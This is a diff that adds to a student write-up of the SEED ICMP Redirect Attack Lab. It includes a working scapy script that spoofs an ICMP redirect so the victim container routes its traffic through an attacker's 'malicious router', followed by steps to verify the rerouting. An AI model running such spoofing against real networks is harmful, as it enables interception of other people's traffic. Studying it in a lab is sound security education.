@@ -1,4 +1,4 @@
-#ICMP Redirect Attack Lab
+ICMP Redirect Attack Lab
 -------------------------
 
 This lab is about creating ICMP redirect. Which is an error message sent by a router to the sender of an IP packet. Redirects are used when a router believes a packet is being routed incorrectly, and it would like to inform the sender that it should use a different router for the subsequent packets sent to that same destination. ICMP redirect can be used by attackers to change a victim's routing.
@@ -25,6 +25,41 @@ We will attack the Victim container from the Attacker container. Checking the ro
 
 We see that the Victim container uses the container router to get to the 192.168.60.0/24 network.
 
-Now we will develop a scapy script to Launch an ICMP redirect.
+Now we will develop a scapy script to Launch an ICMP redirect, icmpredirect.py
+```python
+#!/usr/bin/python3
+from scapy.all import *
+
+## THE SOURCE IS THE DEFAULT GATEWAY, THE DESTINATION OUR VICTIM MACHINE
+ip = IP(src = '10.9.0.11', dst ='10.9.0.5')
+# type 5 is redirect, code 1 is for host
+icmp = ICMP(type=5, code=1)
+## OUR REDIRECT MESSAGE CONTAINS A NEW GATEWAY FOR THE VICTIM MACHINE TO USE
+icmp.gw = '10.9.0.111'
+# The enclosed IP packet should be the one that
+# triggers the redirect message.
+## THIS IS THE SPOOFED ICMP THAT TRIGGERED OUR DEFAULT GATEWAY TO SEND THE
+## REDIRECT MESSAGE.
+ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
+send(ip/icmp/ip2/ICMP())
+``` 
  
- 
+In order to simulate a man in the middle attack on the same subnet we need to spoof an ICMP redirect message that will identify our malicious router as the gateway for the victim machine to use when sending traffic to a machine on a different subnet.
+
+#####**NOTE**
+There is a peculiar issue in the containers mentioned in the [lab documents](https://seedsecuritylabs.org/Labs_20.04/Files/ICMP_Redirect/ICMP_Redirect.pdf) that require the victim container to be pinging the destination while you run the attack. Not sure why this is the author points out that this is only an issue while running this attack on containers.
+
+#### **Verification**
+So while running a ping to a machine on the subnet that 10.9.0.11 is a gateway for we run the attack on the attacker container and are able to get the ICMP redirect to store our malicious router in its routing cache for traffic destined for 192.168.60.5 machine. running 'mtr -n 192.168.60.5' will show a traceroute program documenting the re-routed traffic
+
+![mtroutput](img/mtroutput.png)
+
+
+We can also show the routing cache with the command 'ip route show cache'
+
+![iprouteshow](img/iprouteshow.png)
+
+#### **Questions**
+
+1. Can we use ICMP redirect attacks to redirect to a remote machine?
+
